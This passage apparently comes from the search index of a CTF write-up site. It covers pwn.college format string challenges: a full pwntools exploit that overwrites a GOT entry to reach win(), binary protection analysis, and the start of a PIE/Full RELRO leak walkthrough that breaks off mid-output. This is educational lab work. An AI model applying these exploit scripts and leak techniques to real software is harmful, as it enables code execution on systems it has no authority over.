vulnerability.</p> <p>If you want to understand more deeply and making further analysis, always you can use pwn.college's challenge platfrom. Playform gives plenty of tools and ui. </p> <pre><code>root@9d3ae0bf39ad:/host# ./babyfmt_level7.0\n###\n### Welcome to ./babyfmt_level7.0!\n###\n\nIn this challenge, you will be performing attack against the old and famous vulnerability:\n\"format string vulnerability\". This challenge reads in some bytes and print the\ninput as the format using `printf` in different ways(depending on the specific challenge\nconfiguration). Different challenges have different protections on. ROP may be needed in\nsome challenges. Have fun!\nTo ensure that you are ROPing, rather than doing other tricks, this\nwill sanitize all environment variables and arguments and close all file\ndescriptors &gt; 2,\n\nIn this challenge, you can perform format string attack for infinite times\nYou can use the the attack to leak information and prepare your payload\nAfter your payload is ready, send \"END\" to exit from the while loop\nAnd hopefully your payload can be triggered :)\n\nYou can use `checksec` command to check the protection of the binary.\n\nNow, the program is waiting for your input.\nIf your input contains \"END\", the program exits from the while loop before triggering the vulnerability:\nasd\nShow me what you got :P\nasd\n\nNow, the program is waiting for your input.\nIf your input contains \"END\", the program exits from the while loop before triggering the vulnerability:\nasd\nShow me what you got :P\nasd\n\nNow, the program is waiting for your input.\nIf your input contains \"END\", the program exits from the while loop before triggering the vulnerability:\nEND\n### Goodbye!\n</code></pre>","tags":["pwn","binary-exploitation","format-string","got-overwrite","ctf"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/08-Format-String-Attack-Redirect-Code-Execution-to-win-%28GOT-Overwrite%29/#arch-amd64-64-little","title":"Arch: amd64-64-little","text":"<ul> <li> <p>The binary is 64-bit, little-endian (Intel/AMD convention).</p> </li> <li> <p>So arguments, pointers, and addresses are 8 bytes wide.</p> </li> </ul>","tags":["pwn","binary-exploitation","format-string","got-overwrite","ctf"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/08-Format-String-Attack-Redirect-Code-Execution-to-win-%28GOT-Overwrite%29/#relro-partial-relro","title":"RELRO: Partial RELRO","text":"<ul> <li> <p>RELRO = Relocation Read-Only.</p> </li> <li> <p>Makes certain ELF sections (like the Global Offset Table) read-only after relocation, to stop some GOT overwrite attacks.</p> </li> <li> <p>Partial means:</p> <ul> <li> <p>GOT is still writable \u2192 an attacker might overwrite GOT entries (e.g. function pointers).</p> </li> <li> <p>Only the Global Offset Table\u2019s procedure linkage table resolver is protected.</p> </li> </ul> </li> <li> <p>Full RELRO would lock the entire GOT.</p> </li> </ul>","tags":["pwn","binary-exploitation","format-string","got-overwrite","ctf"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/08-Format-String-Attack-Redirect-Code-Execution-to-win-%28GOT-Overwrite%29/#stack-canary-found","title":"Stack: Canary found","text":"<ul> <li> <p>Compiler inserted a stack canary value (random guard) before saved return addresses.</p> </li> <li> <p>If a buffer overflow overwrites the return address, the canary also changes.</p> </li> <li> <p>On function return, runtime checks if the canary is intact:</p> <ul> <li>If not, program aborts with stack smashing detected.</li> </ul> </li> <li> <p>Protects against stack buffer overflows \u2192 return address overwrite.</p> </li> </ul>","tags":["pwn","binary-exploitation","format-string","got-overwrite","ctf"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/08-Format-String-Attack-Redirect-Code-Execution-to-win-%28GOT-Overwrite%29/#nx-nx-enabled","title":"NX: NX enabled","text":"<ul> <li> <p>Non-Executable stack (also called DEP / Data Execution Prevention).</p> </li> <li> <p>Memory pages for stack/heap are not executable.</p> </li> <li> <p>Stops the classic \u201cshellcode on stack\u201d technique.</p> </li> <li> <p>Attacker can\u2019t just inject code and jump there.</p> </li> <li> <p>Forces exploitation toward techniques like ROP (Return-Oriented Programming) or format string <code>%n</code>-based writes.</p> </li> </ul>","tags":["pwn","binary-exploitation","format-string","got-overwrite","ctf"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/08-Format-String-Attack-Redirect-Code-Execution-to-win-%28GOT-Overwrite%29/#pie-no-pie-0x400000","title":"PIE: No PIE (0x400000)","text":"<ul> <li> <p>PIE = Position Independent Executable.</p> </li> <li> <p>No PIE means binary is mapped at a fixed base address (here <code>0x400000</code>).</p> </li> <li> <p>Function/code offsets are predictable \u2192 makes ROP and format string targeting easier.</p> </li> <li> <p>With PIE enabled, the binary is loaded at random base addresses each run (ASLR applies fully).</p> </li> </ul>","tags":["pwn","binary-exploitation","format-string","got-overwrite","ctf"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/08-Format-String-Attack-Redirect-Code-Execution-to-win-%28GOT-Overwrite%29/#shstk-enabled","title":"SHSTK: Enabled","text":"<ul> <li> <p>Shadow Stack (x86 Control-flow Enforcement Technology, CET).</p> </li> <li> <p>CPU feature: keeps a protected copy of return addresses in a separate \u201cshadow stack\u201d.</p> </li> <li> <p>On function return, CPU verifies return address matches shadow copy.</p> </li> <li> <p>Prevents return address overwrites (ROP).</p> </li> <li> <p>Hardware-enforced, harder to bypass.</p> </li> </ul>","tags":["pwn","binary-exploitation","format-string","got-overwrite","ctf"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/08-Format-String-Attack-Redirect-Code-Execution-to-win-%28GOT-Overwrite%29/#ibt-enabled","title":"IBT: Enabled","text":"<ul> <li> <p>Indirect Branch Tracking (another CET feature).</p> </li> <li> <p>Ensures indirect jumps/calls only land on valid, marked instructions.</p> </li> <li> <p>Blocks control-flow hijacks that jump into the middle of gadgets (ROP/JOP).</p> </li> <li> <p>Makes code-reuse attacks much harder.</p> </li> </ul>","tags":["pwn","binary-exploitation","format-string","got-overwrite","ctf"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/08-Format-String-Attack-Redirect-Code-Execution-to-win-%28GOT-Overwrite%29/#stripped-no","title":"Stripped: No","text":"<ul> <li> <p>Binary still has symbols (function names, debug info).</p> </li> <li> <p>Easier to reverse engineer, since function names aren\u2019t removed.</p> </li> <li> <p>In a real hardened release, binaries are usually stripped.</p> </li> </ul> <p>Binary has the protections in summary:</p> <ul> <li>Partial RELRO \u2192 GOT partly protected.</li> <li>Stack Canary \u2192 detects stack smashing.</li> <li>NX (DEP) \u2192 prevents code execution from stack/heap.</li> <li>No PIE \u2192 base address fixed, gadgets predictable.</li> <li>SHSTK \u2192 hardware shadow stack, blocks return overwrite.</li> <li>IBT \u2192 indirect branch tracking, restricts jumps/calls.</li> </ul> <pre><code>root@9d3ae0bf39ad:/host# checksec ./babyfmt_level7.0\n[*] '/host/babyfmt_level7.0'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    SHSTK:      Enabled\n    IBT:        Enabled\n    Stripped:   No\n</code></pre> <p>Since binary is not stripped. So can look for symbols.</p>","tags":["pwn","binary-exploitation","format-string","got-overwrite","ctf"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/08-Format-String-Attack-Redirect-Code-Execution-to-win-%28GOT-Overwrite%29/#looking-to-symbols","title":"Looking to symbols","text":"<p>The redirect address found in the symbols. win function is not standard function and if you are familiar basic CTF challenges. This name commonly used by challenge creators.</p> <p><code>readelf -s ./babyfmt_level7.0</code></p> <pre><code>    64: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND close@@GLIBC_2.2.5\n    65: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND read@@GLIBC_2.2.5\n    66: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_mai[...]\n    67: 0000000000404090     0 NOTYPE  GLOBAL DEFAULT   25 __data_start\n    68: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__\n    69: 0000000000404098     0 OBJECT  GLOBAL HIDDEN    25 __dso_handle\n    70: 0000000000402000     4 OBJECT  GLOBAL DEFAULT   17 _IO_stdin_used\n    71: 00000000004014f9    71 FUNC    GLOBAL DEFAULT   15 init\n    72: 00000000004012f6   515 FUNC    GLOBAL DEFAULT   15 DUMP_STACK\n    73: 000000000040158a   391 FUNC    GLOBAL DEFAULT   15 func\n    74: 00000000004018c0   101 FUNC    GLOBAL DEFAULT   15 __libc_csu_init\n    75: 00000000004040f0     8 OBJECT  GLOBAL DEFAULT   26 sz_\n    76: 0000000000401540    74 FUNC    GLOBAL DEFAULT   15 win -------&gt; THE REDIRECT FOUND!\n    77: 00000000004040f8     8 OBJECT  GLOBAL DEFAULT   26 rp_\n    78: 0000000000404108     0 NOTYPE  GLOBAL DEFAULT   26 _end\n    79: 0000000000401240     5 FUNC    GLOBAL HIDDEN    15 _dl_relocate_sta[...]\n    80: 0000000000401210    47 FUNC    GLOBAL DEFAULT   15 _start\n    81: 0000000000404100     8 OBJECT  GLOBAL DEFAULT   26 sp_\n    82: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND sendfile@@GLIBC_2.2.5\n    83: 00000000004040a0     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start\n    84: 0000000000401711   425 FUNC    GLOBAL DEFAULT   15 main\n    85: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setvbuf@@GLIBC_2.2.5\n    86: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND open@@GLIBC_2.2.5\n    87: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@@GLIBC_2.2.5\n    88: 00000000004040a0     0 OBJECT  GLOBAL HIDDEN    25 __TMC_END__\n    89: 0000000000401000     0 FUNC    GLOBAL HIDDEN    12 _init\n</code></pre> <p>Looking what is doing the win function. Basically its reading the flag, and shows with sendfile func.</p> <pre><code>pwndbg&gt; disas win\nDump of assembler code for function win:\n   0x0000000000401540 &lt;+0&gt;:     endbr64\n   0x0000000000401544 &lt;+4&gt;:     push   rbp\n   0x0000000000401545 &lt;+5&gt;:     mov    rbp,rsp\n   0x0000000000401548 &lt;+8&gt;:     lea    rdi,[rip+0xba1]        # 0x4020f0\n   0x000000000040154f &lt;+15&gt;:    call   0x401130 &lt;puts@plt&gt;\n   0x0000000000401554 &lt;+20&gt;:    mov    esi,0x0\n   0x0000000000401559 &lt;+25&gt;:    lea    rdi,[rip+0xbac]        # 0x40210c\n   0x0000000000401560 &lt;+32&gt;:    mov    eax,0x0\n   0x0000000000401565 &lt;+37&gt;:    call   0x4011e0 &lt;open@plt&gt;\n   0x000000000040156a &lt;+42&gt;:    mov    ecx,0x400\n   0x000000000040156f &lt;+47&gt;:    mov    edx,0x0\n   0x0000000000401574 &lt;+52&gt;:    mov    esi,eax\n   0x0000000000401576 &lt;+54&gt;:    mov    edi,0x1\n   0x000000000040157b &lt;+59&gt;:    call   0x4011c0 &lt;sendfile@plt&gt;\n   0x0000000000401580 &lt;+64&gt;:    mov    edi,0x0\n   0x0000000000401585 &lt;+69&gt;:    call   0x4011f0 &lt;exit@plt&gt;\nEnd of assembler dump.\npwndbg&gt; x/s 0x4020f0\n0x4020f0:       \"You win! Here is your flag:\"\npwndbg&gt; x/s 0x40210c\n0x40210c:       \"/flag\"\n</code></pre>","tags":["pwn","binary-exploitation","format-string","got-overwrite","ctf"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/08-Format-String-Attack-Redirect-Code-Execution-to-win-%28GOT-Overwrite%29/#choosing-the-target","title":"Choosing the target","text":"<p>Since the RELRO proction is partial. That means Global Offset Table (GOT) writeable. After openning binary with pwngdb/gef stop anywhere you want, check the got. As seen below GOT lies in writeable memory area and there plenty of targets waiting for manipulation.</p> <p>I will not deep dive into the how GOT take key roles for the function calling convention in this post. But dedicated detailed explanation will be written later. Basic diagram like this.</p> <pre><code>`call printf -&gt; follows printf@plt -&gt; follows printf@got.plt(GOT entry of printf)`\n\n    if dynamic resolver (**_dl_runtime_resolve_XXX**) (depends on libc) didn't resolve before jmps _dl_runtime_resolve_XXX\n    if already resolved before, the printf GOT entry stores glibc address of __printf.\n</code></pre> <p>Also depends of LIBC version there are other targets like,  * Messing with glibc File Structures * Messing with glibc handlers and linker</p> <p>can be added plenty of other targets. Even if wanted, heap can be targeted.</p> <p>So keeping things to simple, now the obvious target is GOT Entries.</p> <pre><code>pwndbg&gt; got\nFiltering out read-only entries (display them with -r or --show-readonly)\n\nState of the GOT of /host/babyfmt_level7.0:\nGOT protection: Partial RELRO | Found 15 GOT entries passing the filter\n[0x404018] putchar@GLIBC_2.2.5 -&gt; 0x401030 \u25c2\u2014 endbr64 \n[0x404020] puts@GLIBC_2.2.5 -&gt; 0x401040 \u25c2\u2014 endbr64 \n[0x404028] strlen@GLIBC_2.2.5 -&gt; 0x401050 \u25c2\u2014 endbr64 \n[0x404030] __stack_chk_fail@GLIBC_2.4 -&gt; 0x401060 \u25c2\u2014 endbr64 \n[0x404038] setbuf@GLIBC_2.2.5 -&gt; 0x401070 \u25c2\u2014 endbr64 \n[0x404040] printf@GLIBC_2.2.5 -&gt; 0x401080 \u25c2\u2014 endbr64 \n[0x404048] __assert_fail@GLIBC_2.2.5 -&gt; 0x401090 \u25c2\u2014 endbr64 \n[0x404050] memset@GLIBC_2.2.5 -&gt; 0x4010a0 \u25c2\u2014 endbr64 \n[0x404058] close@GLIBC_2.2.5 -&gt; 0x4010b0 \u25c2\u2014 endbr64 \n[0x404060] read@GLIBC_2.2.5 -&gt; 0x4010c0 \u25c2\u2014 endbr64 \n[0x404068] sendfile@GLIBC_2.2.5 -&gt; 0x4010d0 \u25c2\u2014 endbr64 \n[0x404070] setvbuf@GLIBC_2.2.5 -&gt; 0x4010e0 \u25c2\u2014 endbr64 \n[0x404078] open@GLIBC_2.2.5 -&gt; 0x4010f0 \u25c2\u2014 endbr64 \n[0x404080] exit@GLIBC_2.2.5 -&gt; 0x401100 \u25c2\u2014 endbr64 \n[0x404088] strstr@GLIBC_2.2.5 -&gt; 0x401110 \u25c2\u2014 endbr64 \npwndbg&gt; xinfo 0x404000\nExtended information for virtual address 0x404000:\n\n  Containing mapping:\n          0x404000           0x405000 rw-p     1000    3000 babyfmt_level7.0\n\n  Offset information:\n         Mapped Area 0x404000 = 0x404000 + 0x0\n         File (Base) 0x404000 = 0x400000 + 0x4000\n      File (Segment) 0x404000 = 0x403e08 + 0x1f8\n         File (Disk) 0x404000 = /host/babyfmt_level7.0 + 0x3000\n\n Containing ELF sections:\n            .got.plt 0x404000 = 0x404000 + 0x0\n</code></pre> <p>The red lines highlighting the process of infinite loop. If user input has END string, loop breaks, which highlighted with green lines. </p> <p></p> <p>Sometimes disassemblers could fail to disassemble/pseudo code generation. So  rechecking with the different disassemblers or with debugger not hurt.</p> <p>Here is how radare2 is shows the logic with visual view.</p> <p></p> <p>So what can be done, there are plenty of calls inside while loop. Possible targets could be memset, puts, read or direct printf itself even __stack_chk_fail itself if you want to mess with the canary value. Choose which one you like.</p>","tags":["pwn","binary-exploitation","format-string","got-overwrite","ctf"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/08-Format-String-Attack-Redirect-Code-Execution-to-win-%28GOT-Overwrite%29/#find-offset-and-padlen-values","title":"find offset and padlen values","text":"<p>I'm so lazy, so the END keyword cause the problem with pwntools. So i edited fmtstr.py in my docker with END to ENT in FmtStr.leak_stack method.</p> <p>In my docker environment the file located at: <code>/usr/local/lib/python3.12/dist-packages/pwnlib/fmtstr.py</code></p> <pre><code>[*] Found format string offset: 10\n[+] User input starts at  : 10\n[+] Needed pads           :0\n[+] Numbwritten           :0\n</code></pre>","tags":["pwn","binary-exploitation","format-string","got-overwrite","ctf"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/08-Format-String-Attack-Redirect-Code-Execution-to-win-%28GOT-Overwrite%29/#get_flagpy","title":"get_flag.py","text":"<p>It's not necessary but i downloaded the GLIBC file. From this point i always include the libc files same as pwn.college environment.</p> <p>As a target choosen read . If you look again the win function inside, puts, open, sendfile and exit functions calling. So i don't wanna mess up with them. read is simple. After calling win the program exiting directly already. </p> <pre><code>call read \u2192 read@plt \u2192 jmp [read@got]\n                      \u21b3 we overwrite read@got = &amp;win\nNext call to read() \u2192 indirect jmp lands at win (preferably start with endbr64)\n\u2192 win prints flag &amp; exits\n</code></pre> <p>Keep things simple as before, for the write operation choosed FmtStr from pwntools &lt;3.</p> <pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# This exploit template was generated via:\n# $ pwn template '--libc=libc.so.6' ./babyfmt_level7.0\nfrom pwn import *\n\n# Set up pwntools for the correct architecture\nexe = context.binary = ELF(args.EXE or './babyfmt_level7.0')\n\n# Many built-in settings can be controlled on the command-line and show up\n# in \"args\".  For example, to dump all data sent/received, and disable ASLR\n# for all created processes...\n# ./exploit.py DEBUG NOASLR\n\n# Use the specified remote libc version unless explicitly told to use the\n# local system version with the `LOCAL_LIBC` argument.\n# ./exploit.py LOCAL LOCAL_LIBC\nif args.LOCAL_LIBC:\n    libc = exe.libc\nelse:\n    library_path = libcdb.download_libraries('libc.so.6')\n    if library_path:\n        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)\n        libc = exe.libc\n    else:\n        libc = ELF('libc.so.6')\n\ndef start(argv=[], *a, **kw):\n    '''Start the exploit against the target.'''\n    if args.GDB:\n        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n    else:\n        return process([exe.path] + argv, *a, **kw)\n\n# Specify your GDB script here for debugging\n# GDB will be launched if the exploit is run via e.g.\n# ./exploit.py GDB\ngdbscript = '''\n#tbreak main\ncontinue\n'''.format(**locals())\n\n#===========================================================\n#                    EXPLOIT GOES HERE\n#===========================================================\n# Arch:     amd64-64-little\n# RELRO:      Partial RELRO\n# Stack:      Canary found\n# NX:         NX enabled\n# PIE:        No PIE (0x400000)\n# SHSTK:      Enabled\n# IBT:        Enabled\n# Stripped:   No\n\ndef send_fmt(payload):\n    io.sendafter(b'triggering the vulnerability:\\n', payload)\n\nio = start()\n\noffset = 10\npadlen = 0\n\nf = FmtStr(send_fmt, offset=offset, padlen=padlen, numbwritten=0)\nf.write(exe.got['read'], exe.sym.win)\nf.execute_writes()\n\nio.interactive()\n</code></pre> <p>The result:</p> <pre><code>[+] Starting local process '/host/babyfmt_level7.0_remotelibc': pid 451\n[*] Switching to interactive mode\n[*] Process '/host/babyfmt_level7.0_remotelibc' stopped with exit code 0 (pid 451)\nShow me what you got :P\nYou win! Here is your flag:\npwn.college{kvX************************************EzW}\n[*] Got EOF while reading in interactive\n</code></pre>","tags":["pwn","binary-exploitation","format-string","got-overwrite","ctf"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/08-Format-String-Attack-Redirect-Code-Execution-to-win-%28GOT-Overwrite%29/#references","title":"References","text":"<p>Official glibc manual on formatted output, including dynamic width/precision. https://www.gnu.org/software/libc/manual/html_node/Formatted-Output.html</p> <p>POSIX <code>printf(3)</code> man page covering <code>%n</code>, <code>%m$</code>, and <code>*</code>. https://man7.org/linux/man-pages/man3/printf.3.html</p> <p>Open Group specification for <code>fprintf</code>, detailing positional arguments. https://pubs.opengroup.org/onlinepubs/9699919799/functions/fprintf.html</p> <p>CERT C secure coding rule FIO30-C on excluding user input from format strings. https://wiki.sei.cmu.edu/confluence/display/c/FIO30-C.%2BExclude%2Buser%2Binput%2Bfrom%2Bformat%2Bstrings</p> <p>MITRE CWE-134 entry for externally-controlled format string vulnerabilities. https://cwe.mitre.org/data/definitions/134.html</p> <p>Pwntools documentation for <code>FmtStr</code> helper and format string exploitation. https://docs.pwntools.com/en/stable/fmtstr.html</p> <p>Pwntools source code showing <code>fmtstr_payload</code> implementation. https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/fmtstr.py#L1027</p> <p>Exploit Education lab on format string vulnerabilities (hands-on practice). https://exploit.education/phoenix/format-string/</p> <p>CTF 101 primer on what format string vulnerabilities are and how they work. https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/</p> <p>pwn.college educational track on format string exploitation. https://pwn.college/software-exploitation/format-string-exploits</p> <p>Classic paper Exploiting Format String Vulnerabilities by scut/Team TESO. https://cs155.stanford.edu/papers/formatstring-1.2.pdf</p> <p>OWASP wiki entry on format string attacks. https://owasp.org/www-community/attacks/Format_string_attack</p> <p>LiveOverflow video introducing format string basics in CTFs. https://www.youtube.com/watch?v=0WvrSfcdq1I</p> <p>title: Format String Attack - Redirect Code Execution (GOT Overwrite) summary: Exploit write-up for babyfmt_level7.0 using a format string vulnerability to overwrite a GOT entry and redirect execution to win(). date: 2025-08-20 categories:   - Pwn   - Format String Vulnerabilities   - CTF tags:   - binary-exploitation   - printf   - got-overwrite   - nx   - relro authors:   - \u0130smail BOZKURT</p>","tags":["pwn","binary-exploitation","format-string","got-overwrite","ctf"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/09-Format-String-Attack-Redirect-Code-Execution-%28Full-Relro%2BPIE-Enabled%29/","title":"Format String Attack - Redirect Code Execution (Full Relro+PIE Enabled)","text":"<p>RELRO = Relocation Read-Only. It\u2019s an ELF security hardening feature that changes how the Global Offset Table (GOT) is handled at runtime.</p> <p>Full RELRO (compile with <code>-z relro -z now</code>): - The dynamic linker resolves all symbols immediately at startup (instead of lazy resolution). - After that, the entire GOT (including <code>.got.plt</code>) is made read-only. - This means you can\u2019t perform classic GOT-overwrite attacks anymore.</p> <p>PIE = Position Independent Executable. It makes the binary behave like a shared library in terms of loading. Instead of always loading at a fixed base address (e.g. <code>0x400000</code>), the entire binary is relocated to a random base address each run.</p> <p>PIE enabled:    - Code section, functions, and globals shift to a different base address at each execution.    - Combined with ASLR (Address Space Layout Randomization), every run has a different layout.     - Attacker must first leak an address to calculate offsets.</p>","tags":["binary-exploitation","format-string-attack","full-relro","pie","libc-leak","rop","pwn","CTF","linux-exploitation"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/09-Format-String-Attack-Redirect-Code-Execution-%28Full-Relro%2BPIE-Enabled%29/#babyfmt_level80","title":"babyfmt_level8.0","text":"<pre><code>root@98c8193f4dfd:/host# checksec ./babyfmt_level8.0\n[*] '/host/babyfmt_level8.0'\n    Arch:       amd64-64-little\n    RELRO:      Full RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n    SHSTK:      Enabled\n    IBT:        Enabled\n    Stripped:   No\n</code></pre> <p>The challenge same as previous one except, This time PIE enabled and FULL RELRO . That means explained above, GOT is not writable also code section, functions, and globals shift to a different base address at each execution.</p> <p>The way to achieve flag is same. win function luckily still there. But the target is not clear as win function.</p> <p>After generating the template PoC with pwntools with <code>pwn template --libc=./libc.so.6 ./babyfmt_level8.0|tee exploit.py</code>, sent <code>%p|%p|%p|%p|%p|%p|%p|%p|</code>.</p> <pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# This exploit template was generated via:\n# $ pwn template '--libc=./libc.so.6' ./babyfmt_level8.0\nfrom pwn import *\n\n# Set up pwntools for the correct architecture\nexe = context.binary = ELF(args.EXE or './babyfmt_level8.0')\n\n# Many built-in settings can be controlled on the command-line and show up\n# in \"args\".  For example, to dump all data sent/received, and disable ASLR\n# for all created processes...\n# ./exploit.py DEBUG NOASLR\n\n# Use the specified remote libc version unless explicitly told to use the\n# local system version with the `LOCAL_LIBC` argument.\n# ./exploit.py LOCAL LOCAL_LIBC\nif args.LOCAL_LIBC:\n    libc = exe.libc\nelse:\n    library_path = libcdb.download_libraries('./libc.so.6')\n    if library_path:\n        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)\n        libc = exe.libc\n    else:\n        libc = ELF('./libc.so.6')\n\ndef start(argv=[], *a, **kw):\n    '''Start the exploit against the target.'''\n    if args.GDB:\n        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n    else:\n        return process([exe.path] + argv, *a, **kw)\n\n# Specify your GDB script here for debugging\n# GDB will be launched if the exploit is run via e.g.\n# ./exploit.py GDB\ngdbscript = '''\nbrva 0x17a0\ncontinue\n'''.format(**locals())\n\n#===========================================================\n#                    EXPLOIT GOES HERE\n#===========================================================\n# Arch:     amd64-64-little\n# RELRO:      Full RELRO\n# Stack:      Canary found\n# NX:         NX enabled\n# PIE:        PIE enabled\n# SHSTK:      Enabled\n# IBT:        Enabled\n# Stripped:   No\n\ndef send_fmt(payload):\n    io.sendafter(b'vulnerability:\\n', payload)\n\n\nio = start()\n\n\n#### write part ####\noffset = 30\npadlen = 7\n\nsend_fmt('%p|%p|%p|%p|%p|%p|%p|%p|')\n\nio.interactive()\n</code></pre>","tags":["binary-exploitation","format-string-attack","full-relro","pie","libc-leak","rop","pwn","CTF","linux-exploitation"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/09-Format-String-Attack-Redirect-Code-Execution-%28Full-Relro%2BPIE-Enabled%29/#finding-leak-points-in-stack","title":"Finding leak points in stack","text":"<p>One screenshot but tells tons of things.</p> <p>1- 1st and 3rd offsets always points to address inside libc. So these addresses is could be targeted for libc calculations. The offset of the libc address marked with green box. 2- Same examination could be follow after settling breakpoint at 0x17a0. In your binary the offset may different. So consider in your binary and environment.</p> <p>But only libc address is not enough, still need to find an address inside binary memory space. So can calculate the exe base address.</p> <p></p> <p>My workflow same as below. Checking stack with awesome features telescope and probeleak.</p> <p>The below output shows where leaked address comes 0x00007f0b0a7e0297 address. If you look a little close, you can realize there is also addresses from executable memory space addresses comes after.</p> <p>The address 0x00007f0b0a7e0297 is the address of write+23 and offset in libc: 0x10e297</p> <pre><code>pwndbg&gt; probeleak $rsp-0x100 0x650\nLEGEND: STACK | HEAP | CODE | DATA | WX | RODATA\n0x010: 0x00007ffd0b6ed970 = (rw-p) [stack] + 0x1f970\n0x018: 0x00007f0b0a733d3f = (r-xp) /root/.cache/.pwntools-cache-3.12/libcdb_libs/5792732f783158c66fb4f3756458ca24e46e827d/libc-2.31.so + 0x3fd3f (printf+175)\n0x028: 0x00007ffd0b6ed4f0 = (rw-p) [stack] + 0x1f4f0\n0x030: 0x00007ffd0b6ed430 = (rw-p) [stack] + 0x1f430\n0x048: 0x00007f0b0a8bf723 = (rw-p) /root/.cache/.pwntools-cache-3.12/libcdb_libs/5792732f783158c66fb4f3756458ca24e46e827d/libc-2.31.so + 0x1723 (_IO_2_1_stdout_+131)\n0x058: 0x00007f0b0a7e0297 = (r-xp) /root/.cache/.pwntools-cache-3.12/libcdb_libs/5792732f783158c66fb4f3756458ca24e46e827d/libc-2.31.so + 0xec297 (write+23)\n0x080: 0x00007f0b0a8bf6a0 = (rw-p) /root/.cache/.pwntools-cache-3.12/libcdb_libs/5792732f783158c66fb4f3756458ca24e46e827d/libc-2.31.so + 0x16a0 (_IO_2_1_stdout_)\n0x088: 0x000055a2df9f853d = (r--p) /host/babyfmt_level8.0_remotelibc + 0x53d\n0x090: 0x000055a2df9fa020 = (rw-p) /host/babyfmt_level8.0_remotelibc + 0x20 (stdout@@GLIBC_2.2.5)\n0x098: 0x00007f0b0a8bb4a0 = (r--p) /root/.cache/.pwntools-cache-3.12/libcdb_libs/5792732f783158c66fb4f3756458ca24e46e827d/libc-2.31.so + 0x14a0 (__GI__IO_file_jumps)\n0x0a8: 0x00007f0b0a762e93 = (r-xp) /root/.cache/.pwntools-cache-3.12/libcdb_libs/5792732f783158c66fb4f3756458ca24e46e827d/libc-2.31.so + 0x6ee93 (__GI__IO_file_overflow+275)\n0x0b8: 0x00007f0b0a8bf6a0 = (rw-p) /root/.cache/.pwntools-cache-3.12/libcdb_libs/5792732f783158c66fb4f3756458ca24e46e827d/libc-2.31.so + 0x16a0 (_IO_2_1_stdout_)\n0x0c0: 0x000055a2df9f853d = (r--p) /host/babyfmt_level8.0_remotelibc + 0x53d\n0x0c8: 0x00007f0b0a75659a = (r-xp) /root/.cache/.pwntools-cache-3.12/libcdb_libs/5792732f783158c66fb4f3756458ca24e46e827d/libc-2.31.so + 0x6259a (puts+378)\n0x0d8: 0x00007ffd0b6ed970 = (rw-p) [stack] + 0x1f970\n0x0e0: 0x000055a2df9f7220 = (r-xp) /host/babyfmt_level8.0_remotelibc + 0x220 (_start)\n0x0e8: 0x00007ffd0b6edab0 = (rw-p) [stack] + 0x1fab0\n0x0f8: 0x000055a2df9f77a0 = (r-xp) /host/babyfmt_level8.0_remotelibc + 0x7a0 (func+515)\n0x108: 0x00007ffd0b6ed5a9 = (rw-p) [stack] + 0x1f5a9\n0x118: 0x00007f0b0a8c4570 = (rw-p) [anon_7f0b0a8c0] + 0x4570\n0x150: 0x00007f0b0a8fd4f8 = (rw-p) [anon_7f0b0a8fd] + 0x4f8\n0x158: 0x00007ffd0b6ed708 = (rw-p) [stack] + 0x1f708\n0x560: 0x000055a2df9f7970 = (r-xp) /host/babyfmt_level8.0_remotelibc + 0x970 (__libc_csu_init)\n0x570: 0x00007ffd0b6ed9c0 = (rw-p) [stack] + 0x1f9c0\n0x578: 0x000055a2df9f7970 = (r-xp) /host/babyfmt_level8.0_remotelibc + 0x970 (__libc_csu_init)\n0x580: 0x00007ffd0b6ed9c0 = (rw-p) [stack] + 0x1f9c0\n0x588: 0x000055a2df9f795a = (r-xp) /host/babyfmt_level8.0_remotelibc + 0x95a (main+406)\n0x598: 0x00007ffd0b6edac8 = (rw-p) [stack] + 0x1fac8\n0x5a0: 0x00007ffd0b6edab8 = (rw-p) [stack] + 0x1fab8\n0x5c0: 0x00007ffd0b6edac0 = (rw-p) [stack] + 0x1fac0\n0x5c8: 0x00007ffd0b6edb50 = (rw-p) [stack] + 0x1fb50\n0x5d8: 0x00007f0b0a6f6083 = (r-xp) /root/.cache/.pwntools-cache-3.12/libcdb_libs/5792732f783158c66fb4f3756458ca24e46e827d/libc-2.31.so + 0x2083 (__libc_start_main+243)\n0x5e0: 0x00007f0b0a8fb620 = (r--p) /root/.cache/.pwntools-cache-3.12/libcdb_libs/5792732f783158c66fb4f3756458ca24e46e827d/ld-2.31.so + 0x620 (_rtld_global_ro)\n0x5e8: 0x00007ffd0b6edab8 = (rw-p) [stack] + 